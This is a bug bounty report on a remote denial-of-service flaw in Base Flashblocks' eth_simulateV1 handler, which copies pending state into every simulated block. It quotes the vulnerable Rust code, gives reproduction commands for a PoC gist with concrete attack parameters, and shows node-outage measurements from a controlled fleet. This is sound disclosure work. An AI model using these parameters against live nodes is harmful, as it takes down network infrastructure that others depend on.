# 76301 bc insight base flashblocks eth simulatev1 pending state expansion enables remote node dos

**Submitted on May 3rd 2026 at 18:58:35 UTC by @z41zen for** [**Audit Comp | Base Azul**](https://immunefi.com/audit-competition/audit-comp-base-azul)

* **Report ID:** #76301
* **Report Type:** Blockchain/DLT
* **Report severity:** Insight
* **Target:** <https://github.com/base/base/tree/v0.8.0-rc.28>
* **Impacts:**
  * Shutdown of greater than or equal to 30% of network processing nodes without brute force actions, but does not shut down the network
  * Increasing network processing node resource consumption by at least 30% without brute force actions, compared to the preceding 24 hours

## Description

## Brief/Intro

Base Flashblocks `eth_simulateV1` expands the full Flashblocks pending state override into every requested simulated block before delegating to reth. A remote JSON-RPC client can send valid `eth_simulateV1` requests using the `pending` block tag and force the node to clone and materialize the server-side pending state many times.

The request itself can be very small and can remain within reth's accepted `max_simulate_blocks = 256` limit. In a controlled five-node fleet, six concurrent valid pending-state simulations against each target node made two independent nodes unreachable. That is 2/5 nodes, or 40% of the measured fleet.

## Vulnerability Details

The affected code is in `crates/execution/flashblocks/src/rpc/eth.rs`.

When `eth_simulateV1` is called with the `pending` block tag, Base reads the current Flashblocks pending state:

```rust
if block_id.is_pending() {
    Metrics::rpc_simulate_v1().increment(1);
    let pending_blocks = self.flashblocks_state.get_pending_blocks();
    block_id = pending_blocks.get_canonical_block_number().into();
    pending_overrides.state = pending_blocks.get_state_overrides();
}
```

Base then prepends that pending state to every requested simulated block:

```rust
let mut block_state_calls: Vec<SimBlock<BaseTransactionRequest>> = Vec::new();
for sim_block in opts.block_state_calls {
    let mut state_overrides_builder =
        StateOverridesBuilder::new(pending_overrides.state.clone().unwrap_or_default());
    state_overrides_builder =
        state_overrides_builder.extend(sim_block.state_overrides.unwrap_or_default());
    let final_overrides = state_overrides_builder.build();

    let block_state_call = SimBlock { state_overrides: Some(final_overrides), ..sim_block };
    block_state_calls.push(block_state_call);
}

let payload = SimulatePayload { block_state_calls, ..opts };

EthCall::simulate_v1(&self.eth_api, payload, Some(block_id)).await.map_err(Into::into)
```

This creates O(number\_of\_requested\_blocks \* pending\_state\_size) server-side work before reth processes the request.

Reth does enforce a maximum number of simulated blocks:

```rust
if payload.block_state_calls.len() > self.max_simulate_blocks() as usize {
    return Err(EthApiError::InvalidParams("too many blocks.".to_string()).into())
}
```

However, the Base wrapper creates the expanded `SimulatePayload` before this reth validation is reached. For requests at the limit, such as 256 blocks, reth accepts the request and the node still performs the full pending-state expansion and simulation work.

The method is exposed on Base preconf endpoints. A benign over-limit request confirms that the public endpoints route to reth's `eth_simulateV1` limit check:

```
===== https://mainnet-preconf.base.org =====
3435 bytes
{"jsonrpc":"2.0","error":{"code":-32602,"message":"too many blocks."},"id":1}

===== https://sepolia-preconf.base.org =====
3435 bytes
{"jsonrpc":"2.0","error":{"code":-32602,"message":"too many blocks."},"id":1}
```

Heavy measurements were performed only against controlled local targets.

## Impact Details

The attacker does not need to send the large state. The expensive data is the server-side Flashblocks pending state, which Base copies into every requested simulated block.

At the maximum accepted block count, the JSON-RPC request body is only about 3.4 KiB:

```
blocks=256 bytes=3493 kib=3.4 mib=0.00
blocks=257 bytes=3506 kib=3.4 mib=0.00
blocks=65536 bytes=852133 kib=832.2 mib=0.81
```

Controlled five-node fleet measurement:

```
pending accounts:           8192
storage slots per account:  64
pending storage slots:      524288
blockStateCalls:            256
request size:               3493 bytes
concurrent requests:        6
fleet size:                 5 independent nodes
nodes made unreachable:     2
fleet impact:               40%
```

Observed concurrency threshold:

```
1 concurrent request:
  no RPC availability loss
  single request elapsed about 204 seconds
  max RSS: 18,365,896 KB
  cgroup peak: 28,150,947,840 bytes

3 concurrent requests:
  one node had transient RPC health timeouts
  another node stayed available
  max RSS around 54.6 GB
  not strong enough for the 30% shutdown claim

6 concurrent requests:
  two independent nodes became unreachable
  both had successful baseline health probes before attack
  one node showed repeated eth_blockNumber timeouts
  both nodes stopped accepting new SSH sessions during memory pressure
```

The 6-concurrent case satisfies the impact class for shutdown of greater than or equal to 30% of network processing nodes in the controlled fleet. I am not claiming total Base network shutdown.

## Link to Proof of Concept

<https://gist.github.com/s-zaizen/8f982dc21ed74ac3cc473e4f869a4497>

## Proof of Concept

The PoC is provided as a secret Gist:

`https://gist.github.com/s-zaizen/8f982dc21ed74ac3cc473e4f869a4497`

To reproduce the lightweight confirmation:

```sh
git clone https://gist.github.com/s-zaizen/8f982dc21ed74ac3cc473e4f869a4497.git base-flashblocks-simulatev1-pending-state-dos-poc
cd base-flashblocks-simulatev1-pending-state-dos-poc
bash run_poc.sh
```

The lightweight PoC confirms that Base materializes pending-state copies before reth's over-limit rejection:

```
blocks=257 bytes=3434 kib=3.4 mib=0.00
accounts=128
slots_per_account=8
blocks=257
reth_default_max_simulate_blocks=256
pending_account_overrides=128
pending_storage_slots=1024
materialized_account_overrides=32896
materialized_storage_slots=263168
POC_CONFIRMED=pending_state_materialized_before_reth_limit
```

The external-node availability harness used for the 30%+ fleet measurement is included in:

```
poc/external-node/simulate_v1_external_node.rs
scripts/measure_external_node.py
scripts/run_independent_node.sh
```

To reproduce the external-node path, use a separate checkout of Base at the target commit:

```sh
git clone https://github.com/base/base.git base-independent
cd base-independent
git checkout b7f44d73a3e353f3f0024d2fc55b9a48099c79f4
forge soldeer install
forge build

cp /path/to/poc/external-node/simulate_v1_external_node.rs \
  crates/client/flashblocks-node/tests/
cp /path/to/scripts/measure_external_node.py scripts/
cp /path/to/scripts/run_independent_node.sh scripts/
chmod +x scripts/measure_external_node.py scripts/run_independent_node.sh
```

Single-node availability command:

```sh
POC_ACCOUNTS=8192 \
POC_SLOTS=64 \
POC_BLOCKS=256 \
POC_ATTACKS=6 \
POC_HEALTH_ROUNDS=240 \
POC_HEALTH_INTERVAL=1 \
POC_HEALTH_TIMEOUT=1 \
POC_ATTACK_TIMEOUT=300 \
/usr/bin/time -v timeout 420s scripts/run_independent_node.sh
```

For the 30%+ impact reproduction, run the same command on five independent nodes and monitor each node externally. The measured critical case used five independent nodes and made two nodes unreachable.

## Observed Verification

Observed controlled-fleet output:

```
controlled_fleet_measurement=critical_escalation
fleet_size=5
target_method=eth_simulateV1
health_method=eth_blockNumber
pending_accounts=8192
slots_per_account=64
pending_storage_slots=524288
blocks=256
request_body_bytes=3493
critical_case:
  concurrency=6
  affected_nodes=2
  fleet_size=5
  affected_percent=40
```

Selected node A output from the 6-concurrent case:

```
health_round=baseline available=true elapsed_ms=24 detail={"jsonrpc":"2.0","id":1,"result":"0x0"}
health_round=during_attack_round_0 available=false elapsed_ms=1001 detail=TimeoutError:timed out
health_round=during_attack_round_1 available=false elapsed_ms=1001 detail=TimeoutError:timed out
health_round=during_attack_round_2 available=false elapsed_ms=1001 detail=TimeoutError:timed out
health_round=during_attack_round_15 available=false elapsed_ms=1001 detail=TimeoutError:timed out
health_round=during_attack_round_16 available=false elapsed_ms=1115 detail=TimeoutError:timed out
during_attack_round_14_cgroup_usage_bytes=85995253760
during_attack_round_14_cgroup_peak_bytes=85999996928
during_attack_round_15_cgroup_usage_bytes=85999960064
during_attack_round_15_cgroup_peak_bytes=85999996928
external_ssh_check=Connection timed out during banner exchange
```

Selected node B output from the 6-concurrent case:

```
health_round=baseline available=true elapsed_ms=13 detail={"jsonrpc":"2.0","id":1,"result":"0x0"}
health_round=during_attack_round_6 available=true elapsed_ms=1 detail={"jsonrpc":"2.0","id":1,"result":"0x0"}
during_attack_round_6_cgroup_usage_bytes=60998950912
during_attack_round_6_cgroup_peak_bytes=60999999488
health_round=during_attack_round_7 available=true elapsed_ms=63 detail={"jsonrpc":"2.0","id":1,"result":"0x0"}
during_attack_round_7_cgroup_usage_bytes=60999966720
during_attack_round_7_cgroup_peak_bytes=60999999488
measurement_output=stopped_progressing_at_memory_limit
external_ssh_check=Connection timed out during banner exchange
```

Observed single-node threshold output:

```
1 concurrent, 8192 accounts x 64 slots x 256 blocks:
  attack elapsed: 204126 ms
  max_unavailable=0
  unavailable_rounds=0
  availability_loss_confirmed=false
  Maximum resident set size: 18,365,896 KB
  cgroup peak: 28,150,947,840 bytes

3 concurrent, 8192 accounts x 64 slots x 256 blocks:
  one node: max_unavailable=1, unavailable_rounds=10, availability_loss_confirmed=true
  one node: max_unavailable=0, unavailable_rounds=0, availability_loss_confirmed=false
  Maximum resident set size: about 54.6 GB
```

Observed local-node over-limit measurement highlights:

```
===== highblocks_128x8_blocks65536 =====
request_body_bytes=852133
pending_storage_slots=1024
rpc_elapsed_ms=13218
process_after_request_hwm_kb=12550544
rpc_error=server returned an error response: error code -32602: too many blocks.

===== highstate_512x8_blocks65536 =====
request_body_bytes=852133
pending_storage_slots=4096
rpc_elapsed_ms=55014
process_after_request_hwm_kb=49557544
rpc_error=server returned an error response: error code -32602: too many blocks.
```

## References

* Base Flashblocks `eth_simulateV1` wrapper:
  * `crates/execution/flashblocks/src/rpc/eth.rs`
  * <https://github.com/base/base/blob/b7f44d73a3e353f3f0024d2fc55b9a48099c79f4/crates/execution/flashblocks/src/rpc/eth.rs>
* Lightweight pending-state materialization PoC:
  * `main.rs`
  * `run_poc.sh`
  * `payload_size.py`
* External availability measurement harness:
  * `simulate_v1_external_node.rs`
  * `measure_external_node.py`
  * `run_independent_node.sh`
* Critical controlled-fleet measurement log:
  * `controlled-fleet-critical-measurement.log`
* Secret Gist containing the runnable PoC and evidence:
  * <https://gist.github.com/s-zaizen/8f982dc21ed74ac3cc473e4f869a4497>
